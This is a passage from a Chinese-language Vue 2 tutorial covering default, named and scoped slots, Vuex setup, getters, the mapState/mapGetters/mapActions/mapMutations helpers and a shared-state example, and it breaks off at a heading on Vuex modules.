      <h1 v-show="info.isLoading">加载中....</h1>
      <!-- 展示错误信息 -->
      <h1 v-show="info.errMsg">{{info.errMsg}}</h1>
      </div>
  </template>
  
  <script>
      export default {
          name: "List",
          data() {
              return {
                  info: {
                      isFirst: true,
                      isLoading: false,
                      errMsg: "",
                      users: [],
                  },
              };
          },
          mounted() {
              this.$bus.$on("updateListData", (dataObj) => {
                  this.info = { ...this.info, ...dataObj };
              });
          },
      };
  </script>
  
  <style scoped>
      .album {min-height: 50rem; /* Can be removed; just added for demo purposes */
          padding-top: 3rem;padding-bottom: 3rem;background-color: #f7f7f7;}
      .card {float: left;width: 33.333%;padding: 0.75rem;margin-bottom: 2rem;
          border: 1px solid #efefef;text-align: center;}
      .card > img {margin-bottom: 0.75rem;border-radius: 100px;}
      .card-text {font-size: 85%;}
  </style>
  ~~~

  [用户搜索案例运行结果：](https://s1.ax1x.com/2022/05/11/OdXfgK.png)

  ​                 [<img src="https://s1.ax1x.com/2022/05/11/OdXfgK.png" alt="OdXfgK.png" style="zoom:33%;" />](https://imgtu.com/i/OdXfgK)

## 二十三. 插槽

> Vue 实现了一套内容分发的 API，将`<slot>`元素作为承载分发内容的出口，这是vue文档上的说明。具体来说，`<slot>`就是可以让你在组件内添加内容的空间。

### 1. 默认插槽

举个例子：

~~~vue
//子组件 ：(假设名为：ebutton)
<template>
<div class= 'button'>
    <button>  </button>
    </div>
</template>

//父组件：（引用子组件 ebutton）
<template>
<div class= 'app'>
    <ebutton> </ebutton>
    </div>
</template>
~~~

我们知道，如果直接想要在父组件中的`<ebutton></ebutton>` 中添加内容，是不会在页面上渲染的。那么我们如何使添加的内容能够显示呢？在子组件内添加slot 即可。

示例1：

~~~vue
//子组件 ： (假设名为：ebutton)
<template>
<div class= 'button'>
    <button></button>
    <!--slot 可以放在任意位置。（这个位置就是父组件添加内容的显示位置）-->
    <slot></slot>      
    </div> 
</template>
~~~

> 子组件可以在任意位置添加slot , 这个位置就是父组件添加内容的显示位置。

示例2：

~~~vue
父组件中：
        <Category>
           <div>html结构1</div>
        </Category>
子组件中：Category
        <template>
            <div>
               <!-- 定义插槽 -->
               <slot>插槽默认内容...</slot>
            </div>
        </template>
~~~

### 2. 具名插槽

> 有时候，也许子组件内的slot不止一个，那么我们如何在父组件中，精确的在想要的位置，插入对应的内容,这时候给插槽命一个名即可，即添加name属性。如果不添加，子组件中有几个`<slot>`就将元素全部放入。

示例1：

~~~vue
父组件中：
        <Category>
            <template slot="center">
              <div>html结构1</div>
            </template>

            <template v-slot:footer>
               <div>html结构2</div>
            </template>
        </Category>
子组件中：
        <template>
            <div>
               <!-- 定义插槽 -->
               <slot name="center">插槽默认内容...</slot>
               <slot name="footer">插槽默认内容...</slot>
            </div>
        </template>
~~~

> 上面会将`结构1`与`结构2`放入下方的15和16行代码中
>
> 当然 vue 为了方便，书写 v-slot:one 的形式时，可以简写为 #one

### 3. 作用域插槽 

> 通过slot 我们可以在父组件为子组件添加内容，通过给slot命名的方式，我们可以添加不止一个位置的内容。但是我们添加的数据都是父组件内的。即子组件中的数据我们用不到。有的场景我们必须通过子组件中的数据来进行操作。
>
> 作用域插槽允许你传递一个模板而不是已经渲染好的元素给插槽。之所以叫做”作用域“插槽，是因为模板虽然是在父级作用域中渲染的，却能拿到子组件的数据。

例如，带有作用域插槽的组件 `child` 大概是下面这个样子：

~~~vue
<div>
    <slot my-prop="Hello from child"></slot>
</div>
~~~

使用这个组件的父组件将会在插槽中声明一个 `template` 元素。这个模板元素会有一个 `scope` （译者注：Vue 2.6 后改为 `v-slot` 属性）属性指向一个对象，任何添加到插槽（位于子组件模板）中的属性都会作为这个对象的属性。

~~~vue
<child>
  <template scope="props">
    <span>Hello from parent</span>
    <span>{{ props.my-prop }}</span>
  </template>
</child>
~~~

将会渲染成：

~~~html
<div>
    <span>Hello from parent</span>
    <span>Hello from child</span>
</div>
~~~

其具体结构如下：

~~~vue
父组件中：
        <Category>
            <template scope="scopeData">
                <!-- 生成的是ul列表 -->
                <ul>
                  <li v-for="g in scopeData.games" :key="g">{{g}}</li>
                </ul>
            </template>
        </Category>

        <Category>
            <template slot-scope="scopeData">
                <!-- 生成的是h4标题 -->
                <h4 v-for="g in scopeData.games" :key="g">{{g}}</h4>
            </template>
        </Category>
子组件中：
        <template>
            <div>
                <slot :games="games"></slot>
            </div>
        </template>
		
        <script>
            export default {
                name:'Category',
                props:['title'],
                //数据在子组件自身
                data() {
                    return {
                        games:['红色警戒','穿越火线','劲舞团','超级玛丽']
                    }
                },
            }
        </script>
~~~

### 4. 三种插槽具体案例

- 默认插槽
  App.vue

  ~~~vue
  <template>
  	<div class="container">
  		<Category title="美食" >
  			<img src="https://s3.ax1x.com/2021/01/16/srJlq0.jpg" alt="">
  		</Category>
  
  		<Category title="游戏" >
  			<ul>
  				<li v-for="(g,index) in games" :key="index">{{g}}</li>
  			</ul>
  		</Category>
  
  		<Category title="电影">
  			<video controls src="http://clips.vorwaerts-gmbh.de/big_buck_bunny.mp4"></video>
  		</Category>
  	</div>
  </template>
  
  <script>
  	import Category from './components/Category'
  	export default {
  		name:'App',
  		components:{ Category },
  		data() {
  			return {
  				foods:['火锅','烧烤','小龙虾','牛排'],
  				games:['红色警戒','穿越火线','劲舞团','超级玛丽'],
  				films:['《教父》','《拆弹专家》','《你好，李焕英》','《尚硅谷》']
  			}
  		},
  	}
  </script>
  
  <style scoped>.container{display: flex;justify-content: space-around;}</style>
  ~~~

  Category.vue

  ~~~vue
  <template>
  	<div class="category">
  		<h3>{{ title }}分类</h3>
  		<!-- 定义一个插槽（挖个坑，等着组件的使用者进行填充） -->
  		<slot>我是一些默认值，当使用者没有传递具体结构时，我会出现</slot>
  	</div>
  </template>
  
  <script>
  	export default {
  		name:'Category',
  		props:['title']
  	}
  </script>
  
  <style scoped>
  	.category {background-color: skyblue;width: 200px;height: 300px;}
  	h3 {text-align: center;background-color: orange;}
  	video {width: 100%;}
  	img {width: 100%;}
  </style>
  ~~~

  [默认插槽运行结果：](https://s1.ax1x.com/2022/05/12/O0rNqg.png)                                  [<img src="https://s1.ax1x.com/2022/05/12/O0rNqg.png" alt="O0rNqg.png" style="zoom:50%;" />](https://imgtu.com/i/O0rNqg)

- 具名插槽
  App.vue

  ~~~vue
  <template>
  	<div class="container">
  		<Category title="美食" >
  			<img slot="conter" src="https://s3.ax1x.com/2021/01/16/srJlq0.jpg" alt="">
  			<a slot="footer" href="http://www.atguigu.com">更多美食</a>
  		</Category>
  
  		<Category title="游戏" >
  			<ul slot="center">
  				<li v-for="(g,index) in games" :key="index">{{g}}</li>
  			</ul>
  			<div class="foot" slot="footer">
  				<a href="http://www.atguigu.com">单机游戏</a>
  				<a href="http://www.atguigu.com">网络游戏</a>
  			</div>
  		</Category>
  
  		<Category title="电影">
  			<video slot="center" controls src="http://clips.vorwaerts-gmbh.de/big_buck_bunny.mp4"></video>
  			<template v-slot:footer>
  				<div class="foot">
  					<a href="http://www.atguigu.com">经典</a>
  					<a href="http://www.atguigu.com">热门</a>
  					<a href="http://www.atguigu.com">推荐</a>
  				</div>
  				<h4>欢迎前来观影</h4>
  			</template>
  		</Category>
  	</div>
  </template>
  
  <script>
  	import Category from './components/Category'
  	export default {
  		name:'App',
  		components:{Category},
  		data() {
  			return {
  				foods:['火锅','烧烤','小龙虾','牛排'],
  				games:['红色警戒','穿越火线','劲舞团','超级玛丽'],
  				films:['《教父》','《拆弹专家》','《你好，李焕英》','《尚硅谷》']
  			}
  		},
  	}
  </script>
  
  <style scoped>
  	.container,.foot{display: flex;justify-content: space-around;}
  	h4{text-align: center;}
  </style>
  ~~~

  Category.vue

  ~~~vue
  <template>
  	<div class="category">
  		<h3>{{title}}分类</h3>
  		<!-- 定义一个插槽（挖个坑，等着组件的使用者进行填充） -->
  		<slot name="center">我是一些默认值，当使用者没有传递具体结构时，我会出现1</slot>
  		<slot name="footer">我是一些默认值，当使用者没有传递具体结构时，我会出现2</slot>
  	</div>
  </template>
  
  <script>
  	export default {
  		name:'Category',
  		props:['title']
  	}
  </script>
  
  <style scoped>
  	.category{background-color: skyblue;width: 200px;height: 300px;}
  	h3{text-align: center;background-color: orange;}
  	video{width: 100%;}
  	img{width: 100%;}
  </style>
  ~~~

  [具名插槽运行结果：](https://s1.ax1x.com/2022/05/12/O0r7QK.png)

  ​             [<img src="https://s1.ax1x.com/2022/05/12/O0r7QK.png" alt="O0r7QK.png" style="zoom:50%;" />](https://imgtu.com/i/O0r7QK)

- 作用域插槽
  App.vue

  ~~~vue
  <template>
  	<div class="container">
  
  		<Category title="游戏">
  			<template scope="atguigu">
  				<ul>
  					<li v-for="(g,index) in atguigu.games" :key="index">{{g}}</li>
  				</ul>
  			</template>
  		</Category>
  
  		<Category title="游戏">
  			<template scope="{games}">
  				<ol>
  					<li style="color:red" v-for="(g,index) in games" :key="index">{{g}}</li>
  				</ol>
  			</template>
  		</Category>
  
  		<Category title="游戏">
  			<template slot-scope="{games}">
  				<h4 v-for="(g,index) in games" :key="index">{{g}}</h4>
  			</template>
  		</Category>
  	</div>
  </template>
  
  <script>
  	import Category from './components/Category'
  	export default {
  		name:'App',
  		components:{ Category },
  	}
  </script>
  
  <style scoped>
  	.container,.foot{display: flex;justify-content: space-around;}
  	h4{text-align: center;}
  </style>
  ~~~

  Category.vue

  ~~~vue
  <template>
  	<div class="category">
  		<h3>{{title}}分类</h3>
  		<slot :games="games" msg="hello">我是默认的一些内容</slot>
  	</div>
  </template>
  
  <script>
  	export default {
  		name:'Category',
  		props:['title'],
  		data() {
  			return {
  				games:['红色警戒','穿越火线','劲舞团','超级玛丽'],
  			}
  		},
  	}
  </script>
  
  <style scoped>
  	.category{background-color: skyblue;width: 200px;height: 300px;}
  	h3{text-align: center;background-color: orange;}
  	video{width: 100%;}
    img{width: 100%;}
  </style>
  ~~~

  [作用域插槽运行结果：](https://s1.ax1x.com/2022/05/12/O0spSP.png)

  ​                           <img src="https://s1.ax1x.com/2022/05/12/O0spSP.png" alt="O0spSP.png" style="zoom:50%;" />](https://imgtu.com/i/O0spSP)

## 二十四. ==Vuex技术==

> 概念：专门在Vue中实现集中式状态(数据)管理的一个Vue插件，对vue应用中多个组件的共享状态进行集中式的管理(读/写) ,也是一种组件间通信的方式，且适用于任意组件间通信。`状态==数据`
>
> 使用情景：多个组件依赖于同一状态、来自不同组件的行为需要变更同一状态。

### 1. Vuex的工作原理

> Vuex是专门为Vue服务，用于管理页面的数据状态、提供统一数据操作的状态管理系统，相当于数据库mongoDB，MySQL等，只不过它的数据是存储在内存中，页面刷新即消失。

[Vuex工作流程图：](https://s1.ax1x.com/2022/05/13/OsBo9A.png)

​								[<img src="https://s1.ax1x.com/2022/05/13/OsBo9A.png" alt="OsBo9A.png" style="zoom: 33%;" />](https://imgtu.com/i/OsBo9A)

> 上面的`Actions`、`Mutations`、`State`三个数据类型都是`Object`类型。他们由一个共同的对象领导：`store`。所以调用灰色部分的四个方法(`commit`、`mutate`、`render`、`dispatch`)要用`store.commit()`的形式调用。并且是从`Vue Components`开始，绕一圈。三个对象具体使用情况如下：

|  对象名   |                      描述                      |
| :-------: | :--------------------------------------------: |
|  actions  | 用于响应组件中的动作，dispatch方法用于和它对话 |
| mutations |      用于操作数据，commit方法用于和它对话      |
|   state   |      用于存储数据，mutate方法用于和它对话      |

### 2. 搭建Vuex环境

- 使用如下命令安装Vuex：

  ~~~shell
  npm i vuex
  ~~~

  > 这里要注意的是，Vue在2022年将默认版本更新为Vue3，此时Vuex也更新到了4.0版本，而vuex4.0只能供Vue3使用。所以在Vue2中只能用Vuex3版本。

  如果使用Vue2要使用以下命令安装：

  ~~~shell
  npm i vuex@3
  ~~~

- 由于三个对象(`Actions`、`Mutations`、`State`)都归`store`管理分配，所以创建一个文件用于使用最核心的`store`。

  index.js

  ~~~javascript
  import Vue from 'vue'
  import Vuex from 'vuex'	// 引入Vuex
  
  Vue.use(Vuex)	// 应用Vuex插件
  
  const actions = {}		// 准备actions——用于响应组件中的动作
  const mutations = {}	// 准备mutations——用于操作数据（state）
  const state = {}			// 准备state——用于存储数据
  
  // 创建并暴露store
  export default new Vuex.Store({
      //actions:actions
      actions,
      //mutations:mutations
      mutations,
      //state:state
      state,
  })
  ~~~

- 在main.js中创建vm时传入`store`配置项

  ~~~JavaScript
  import Vue from 'vue'
  import App from './App.vue'
  import store from './store'	// 引入store
  
  Vue.config.productionTip = false
  
  new Vue({
      el: '#app',
      render: h => h(App),
      //store:store,
      store,										// 配置项添加store
      beforeCreate() {
          Vue.prototype.$bus = this
      }
  })
  ~~~

### 3. 编写一个求和案例初步了解Vuex

> 编写一个能在页面进行选择求和的案例。

[编写需求：](https://s1.ax1x.com/2022/05/13/Os2SdP.png)

​												[<img src="https://s1.ax1x.com/2022/05/13/Os2SdP.png" alt="Os2SdP.png" style="zoom:50%;" />](https://imgtu.com/i/Os2SdP)

#### 3.1 先使用Vue编写方便和Vuex做对比

- 编写App.vue文件

  ~~~vue
  <template>
  <div>
      <Count/>
      </div>
  </template>
  
  <script>
      import Count from "./components/Count.vue";
  
      export default {
          name: "App",
          components: { Count },
      };
  </script>
  ~~~

- 编写Cout.vue文件实现网页求和

  ~~~vue
  <template>
  <div>
      <h2>当前求和为：{{ sum }}</h2>
      <select v-model.number="n">
          <option value="1">1</option>
          <option value="2">2</option>
          <option value="3">3</option>
      </select>
      <button @click="increment">+</button>
      <button @click="decrement">-</button>
      <button @click="incrementOdd">当前求和为奇数再加</button>
      <button @click="incrementWait">等一等再加</button>
      </div>
  </template>
  
  <script>
      export default {
          name: "Count",
          data() {
              return {
                  sum: 0, // 当前的和
                  n: 1, // 用户选择的数字
              };
          },
          methods: {
              increment() {
                  this.sum += this.n;
              },
              decrement() {
                  this.sum -= this.n;
              },
              incrementOdd() {
                  if (this.sum % 2) {
                      this.sum += this.n;
                  }
              },
              incrementWait() {
                  setTimeout(() => {
                      this.sum += this.n;
                  }, 500);
              },
          },
      };
  </script>
  
  <style>
      button {margin-left: 5px;}
  </style>
  ~~~

  > 上面代码四个方法分别对应：+number、-number、当前求和为奇数再加、等一等再加这四个功能。其中的`option`中的值用于和n值绑定，代表用户选择的数字。

#### 3.2 使用Vuex编写Cout案例

> 1. 初始化数据state ,配置actions、mutations ,操作文件store.js
> 2. 组件中读取vuex中的数据`$store.state.数据`
> 3. 组件中修改vuex 中的数据`$store.dispatch('action中的方法名',数据)`或`$store.commit('mutations中的方法名' ,数据)`
>    若没有网络请求或其他业务逻辑，组件中也可越过actions即不写dispatch ，直接编写commit。

- 首先编写index.js

  ~~~JavaScript
  import Vue from 'vue'
  import Vuex from 'vuex'	// 引入Vuex
  
  Vue.use(Vuex)	// 应用Vuex插件
  
  // 准备actions——用于响应组件中的动作
  const actions = {
      /* jia(context,value){
  		console.log('actions中的jia被调用了')
  		context.commit('JIA',value)
  	},
  	jian(context,value){
  		console.log('actions中的jian被调用了')
  		context.commit('JIAN',value)
  	}, */
      jiaOdd(context,value){	// context 相当于精简版的 $store
          console.log('actions中的jiaOdd被调用了')
          if(context.state.sum % 2){
              context.commit('JIA',value)
          }
      },
      jiaWait(context,value){
          console.log('actions中的jiaWait被调用了')
          setTimeout(()=>{
              context.commit('JIA',value)
          },500)
      }
  }
  // 准备mutations——用于操作数据（state）
  const mutations = {
      JIA(state,value){
          console.log('mutations中的JIA被调用了')
          state.sum += value
      },
      JIAN(state,value){
          console.log('mutations中的JIAN被调用了')
          state.sum -= value
      }
  }
  // 准备state——用于存储数据
  const state = {
      sum:0 //当前的和
  }
  
  // 创建并暴露store
  export default new Vuex.Store({
      actions,
      mutations,
      state,
  })
  ~~~

- 编写Cout.vue

  ~~~vue
  <template>
  <div>
      <h1>当前求和为：{{ $store.state.sum }}</h1>
      <select v-model.number="n">
          <option value="1">1</option>
          <option value="2">2</option>
          <option value="3">3</option>
      </select>
      <button @click="increment">+</button>
      <button @click="decrement">-</button>
      <button @click="incrementOdd">当前求和为奇数再加</button>
      <button @click="incrementWait">等一等再加</button>
      </div>
  </template>
  
  <script>
      export default {
          name:'Count',
          data() {
              return {
                  n:1, //用户选择的数字
              }
          },
          methods: {
              //这两个使用commit方法是因为，不需要actions做判断。
              increment(){
                  this.$store.commit('JIA',this.n)
              },
              decrement(){
                  this.$store.commit('JIAN',this.n)
              },
              incrementOdd(){
                  this.$store.dispatch('jiaOdd',this.n)
              },
              incrementWait(){
                  this.$store.dispatch('jiaWait',this.n)
              },
          }
      }
  </script>
  
  <style lang="css">button{margin-left: 5px;}</style>
  
  ~~~

  [运行结果：](https://s1.ax1x.com/2022/05/13/Os2SdP.png)

  ​												[<img src="https://s1.ax1x.com/2022/05/13/Os2SdP.png" alt="Os2SdP.png" style="zoom:50%;" />](https://imgtu.com/i/Os2SdP)

### 4. getters配置项

> 由于`computed`配置项只能用于单个组件，如果想让所有组件都用到计算属性，那么我们就要配置全局计算，store下的`getters`配置项就是配置一个所有组件都可以获取到的全局计算属性。
>
> 使用场景：当state中的数据需要经过加工后再使用时，可以使用getters加工。
>
> 读取方法是：`$store.getters.方法名`

配置方法是在store配置项中追加getters配置项

~~~JavaScript
......

const getters = {
    bigSum(state){
        return state.sum * 10
    }
}

// 创建并暴露store
export default new Vuex.Store({
    ......
    getters
})
~~~

- 修改组件求和案例，使其每次加1的同时还可以扩大10倍

  ~~~JavaScript
  //index.js
  
  import Vue from 'vue'	// 引入Vue核心库
  import Vuex from 'vuex'	// 引入Vuex
  
  Vue.use(Vuex)	// 应用Vuex插件
  
  // 准备actions对象——响应组件中用户的动作
  const actions = {
      addOdd(context,value){
          console.log("actions中的addOdd被调用了")
          if(context.state.sum % 2){context.commit('ADD',value)}
      },
      addWait(context,value){
          console.log("actions中的addWait被调用了")
          setTimeout(()=>{context.commit('ADD',value)},500)
      },
  }
  // 准备mutations对象——修改state中的数据
  const mutations = {
      ADD(state,value){state.sum += value},
      SUBTRACT(state,value){state.sum -= value}
  }
  // 准备state对象——保存具体的数据
  const state = {
      sum:0 // 当前的和
  }
  // 准备getters对象——用于将state中的数据进行加工
  const getters = {
      bigSum(){
          return state.sum * 10
      }
  }
  
  //创建并暴露store
  export default new Vuex.Store({
      actions,
      mutations,
      state,
      getters
  })
  ~~~

- 修改Cout.vue使其可以调用store上的gettings方法将值扩大10倍

  ~~~vue
  <template>
  	<div>
  		<h1>当前求和为：{{ $store.state.sum }}</h1>
  		<h3>当前求和的10倍为：{{ $store.getters.bigSum }}</h3>
  		<select v-model.number="n">
  			<option value="1">1</option>
  			<option value="2">2</option>
  			<option value="3">3</option>
  		</select>
  		<button @click="increment">+</button>
  		<button @click="decrement">-</button>
  		<button @click="incrementOdd">当前求和为奇数再加</button>
  		<button @click="incrementWait">等一等再加</button>
  	</div>
  </template>
  
  <script>
  	export default {
  		name:'Count',
  		data() {
  			return {
  				n:1,
  			}
  		},
  		methods: {
  			increment(){this.$store.commit('ADD',this.n)},
  			decrement(){this.$store.commit('SUBTRACT',this.n)},
  			incrementOdd(){this.$store.dispatch('addOdd',this.n)},
  			incrementWait(){this.$store.dispatch('addWait',this.n)},
  		},
  	}
  </script>
  
  <style>button{margin-left: 5px;}</style>
  ~~~

  [gettings配置项运行结果：](https://s1.ax1x.com/2022/05/14/O6IcuT.png)

  ​                                                      [<img src="https://s1.ax1x.com/2022/05/14/O6IcuT.png" alt="O6IcuT.png" style="zoom:50%;" />](https://imgtu.com/i/O6IcuT)

### 5. 四个Map方法

> Vuex提供了四个Map方法用于简化代码。下面是他们的使用及介绍。

|      方法名      |                             描述                             |
| :--------------: | :----------------------------------------------------------: |
|   **mapState**   |         是用于帮助我们映射`state`中的数据为计算属性          |
|  **mapGetters**  |            用于帮助映射getters中的数据为计算属性             |
|  **mapActions**  | 用于帮助我们生成与`actions`对话的方法，即：包含`$store.dispatch(xxx)`的函数`getters`中的数据为计算属性； |
| **mapMutations** | 用于帮助我们生成与`mutations`对话的方法，即：包含`$store.commit(xxx)`的函数 |

> 我们之前写的代码中`<h1>当前求和为：{{ $store.state.sum }}</h1>`显然插值语法中的表达式太长，不符合规范。我们可以在`computed`属性中书写几个方法，简化插值语法：

~~~JavaScript
computed:{
    //靠程序员自己亲自去写计算属性:
    sum(){
        return this.$store.state.sum
    },
    bigSum(){
        return this.$store.getters.bigSum
    },
}
~~~

此时我们就可以将`Cout.vue`上方的插值语法改为

~~~html
<h1>当前求和为: {{sum}}</h1>
<h3>当前求和放大10倍为: {{bigSum}}</h3>
~~~

> 我们可以看到虽然实现了方法，但代码冗余量高，组件多的情况下不好维护。所以Vuex给我们提供了Map映射方法。下面是四个方法写法：我们用下面方法替代上面的写法。

在使用之前要先导入

~~~JavaScript
import {mapState,mapGetters，mapMutations，mapActions} from 'vuex'
~~~

- **mapState方法：**用于帮助我们映射`state`中的数据为计算属性

  ~~~javascript
  computed: {
      //借助mapState生成计算属性：sum、school、subject（对象写法）
       ...mapState({sum:'sum',school:'school',subject:'subject'}),
      //等同于以下代码
       sum(){
          return this.$store.state.sum
      },   
       school(){
          return this.$store.state.school
      }, 
      subject(){
          return this.$store.state.subject
      },     
      //借助mapState生成计算属性：sum、school、subject（数组写法）
      ...mapState(['sum','school','subject']),
  },
  ~~~

  ==提示：{...}的用法是将`mapState`中的每一组key和value都展开放在`computed`中==

  数组写法中名字要和main.js中的数据和方法名对应。

- **mapGetters方法：**用于帮助我们映射`getters`中的数据为计算属性

  ~~~JavaScript
  computed: {
      //借助mapGetters生成计算属性：bigSum（对象写法）
      ...mapGetters({bigSum:'bigSum'}),
  
      //借助mapGetters生成计算属性：bigSum（数组写法）
      ...mapGetters(['bigSum'])
  },
  ~~~

- **mapActions方法：**用于帮助我们生成与`actions`对话的方法，即：包含`$store.dispatch(xxx)`的函数。

  ~~~JavaScript
  methods:{
      //靠mapActions生成：incrementOdd、incrementWait（对象形式）
      ...mapActions({incrementOdd:'jiaOdd',incrementWait:'jiaWait'})
  
      //靠mapActions生成：incrementOdd、incrementWait（数组形式）
      ...mapActions(['jiaOdd','jiaWait'])
  }
  ~~~

- **mapMutations方法：**用于帮助我们生成与`mutations`对话的方法，即：包含`$store.commit(xxx)`的函数，传递数据时，要注意插值语法中必须传递参数：`<button @click="increment(n)">+</button>`

  ~~~JavaScript
  methods:{
      //靠mapActions生成：increment、decrement（对象形式）
      ...mapMutations({increment:'JIA',decrement:'JIAN'}),
      //等同于以下代码：
      increment(){
          this.$store.commit('JIA',this.n)//这里的n要在插值语法调用时传入
      }, 
      decrement(){
          this.$store.commit('JIAN',this.n)
      },
      //靠mapMutations生成：JIA、JIAN（对象形式）
      ...mapMutations(['JIA','JIAN']),
  }
  ~~~

完整代码

Cout.vue

~~~vue
<template>
	<div>
		<h1>当前求和为：{{ sum }}</h1>
		<h3>当前求和的10倍为：{{ bigSum }}</h3>
		<h3>我是{{name}}，我在{{ school }}学习</h3>
		<select v-model.number="n">
			<option value="1">1</option>
			<option value="2">2</option>
			<option value="3">3</option>
		</select>
		<button @click="increment(n)">+</button>
		<button @click="decrement(n)">-</button>
		<button @click="addOdd(n)">当前求和为奇数再加</button>
		<button @click="addWait(n)">等一等再加</button>
	</div>
</template>

<script>
	import {mapState, mapGetters, mapMutations, mapActions} from 'vuex'	//导入

	export default {
		name: 'Count',
		data() {
			return {
				n:1, //用户选择的数字
			}
		},
  computed: {		
			...mapState(['sum','school','name']),
			...mapGetters(['bigSum'])
		},
		methods: {
			...mapMutations({increment:'ADD', decrement:'SUBTRACT'}),
			...mapActions(['addOdd', 'addWait'])
		},
	}
</script>

<style>
	button{
		margin-left: 5px;
	}
</style>
~~~

[运行结果：](https://s1.ax1x.com/2022/05/13/Os2SdP.png)

​												[<img src="https://s1.ax1x.com/2022/05/13/Os2SdP.png" alt="Os2SdP.png" style="zoom:50%;" />](https://imgtu.com/i/Os2SdP)

### 6. 多组件共享数据案例

- App.vue

  ~~~vue
  <template>
    <div>
      <Count/><hr/>
      <Person/>
    </div>
  </template>
  
  <script>
  import Count from "./components/Count.vue";
  import Person from "./components/Person.vue";
  
  export default {
    name: "App",
    components: { Count, Person },
  };
  </script>
  ~~~

- index.js

  ~~~javascript
  import Vue from 'vue'
  import Vuex from 'vuex'
  
  Vue.use(Vuex)
  
  const actions = {
  	jiaOdd(context,value){
  		console.log('actions中的jiaOdd被调用了')
  		if(context.state.sum % 2){
  			context.commit('JIA',value)
  		}
  	},
  	jiaWait(context,value){
  		console.log('actions中的jiaWait被调用了')
  		setTimeout(()=>{
  			context.commit('JIA',value)
  		},500)
  	}
  }
  
  //准备mutations——用于操作数据（state）
  const mutations = {
  	JIA(state,value){
  		console.log('mutations中的JIA被调用了')
  		state.sum += value
  	},
  	JIAN(state,value){
  		console.log('mutations中的JIAN被调用了')
  		state.sum -= value
  	},
  	ADD_PERSON(state,value){
  		console.log('mutations中的ADD_PERSON被调用了')
  		state.personList.unshift(value)
  	}
  }
  
  //准备state——用于存储数据
  const state = {
  	sum: 0,
  	school: '尚硅谷',
  	subject: '前端',
  	personList: []
  }
  
  //准备getters——用于将state中的数据进行加工
  const getters = {
  	bigSum(state){
  		return state.sum*10
  	}
  }
  
  //创建并暴露store
  export default new Vuex.Store({
  	actions,
  	mutations,
  	state,
  	getters
  })
  ~~~

- Count.vue

  ~~~vue
  <template>
  	<div>
  		<h1>当前求和为：{{ sum }}</h1>
  		<h3>当前求和放大10倍为：{{ bigSum }}</h3>
  		<h3>我在{{ school }}，学习{{ subject }}</h3>
  		<h3 style="color:red">Person组件的总人数是：{{ personList.length }}</h3>
  		<select v-model.number="n">
  			<option value="1">1</option>
  			<option value="2">2</option>
  			<option value="3">3</option>
  		</select>
  		<button @click="increment(n)">+</button>
  		<button @click="decrement(n)">-</button>
  		<button @click="incrementOdd(n)">当前求和为奇数再加</button>
  		<button @click="incrementWait(n)">等一等再加</button>
  	</div>
  </template>
  
  <script>
  	import {mapState,mapGetters,mapMutations,mapActions} from 'vuex'
  	export default {
  		name:'Count',
  		data() {
  			return {
  				n:1, //用户选择的数字
  			}
  		},
  		computed:{
  			...mapState(['sum','school','subject','personList']),
  			...mapGetters(['bigSum'])
  		},
  		methods: {
  			...mapMutations({increment:'JIA',decrement:'JIAN'}),
  			...mapActions({incrementOdd:'jiaOdd',incrementWait:'jiaWait'})
  		}
  	}
  </script>
  
  <style lang="css">button{margin-left: 5px;}</style>
  ~~~

- Person.vue

  ~~~vue
  <template>
  	<div>
  		<h1>当前求和为：{{ sum }}</h1>
  		<h3>当前求和放大10倍为：{{ bigSum }}</h3>
  		<h3>我在{{ school }}，学习{{ subject }}</h3>
  		<h3 style="color:red">Person组件的总人数是：{{ personList.length }}</h3>
  		<select v-model.number="n">
  			<option value="1">1</option>
  			<option value="2">2</option>
  			<option value="3">3</option>
  		</select>
  		<button @click="increment(n)">+</button>
  		<button @click="decrement(n)">-</button>
  		<button @click="incrementOdd(n)">当前求和为奇数再加</button>
  		<button @click="incrementWait(n)">等一等再加</button>
  	</div>
  </template>
  
  <script>
  	import {mapState,mapGetters,mapMutations,mapActions} from 'vuex'
  	export default {
  		name:'Count',
  		data() {
  			return {
  				n:1, //用户选择的数字
  			}
  		},
  		computed:{
  			...mapState(['sum','school','subject','personList']),
  			...mapGetters(['bigSum'])
  		},
  		methods: {
  			...mapMutations({increment:'JIA',decrement:'JIAN'}),
  			...mapActions({incrementOdd:'jiaOdd',incrementWait:'jiaWait'})
  		}
  	}
  </script>
  
  <style lang="css">button{margin-left: 5px;}</style>
  ~~~

[多组件数据共享运行结果：](https://s1.ax1x.com/2022/05/14/Ochaod.png)

​																			[<img src="https://s1.ax1x.com/2022/05/14/Ochaod.png" alt="Ochaod.png" style="zoom:33%;" />](https://imgtu.com/i/Ochaod)

### 7. Vuex模块化+命名空间

### 											





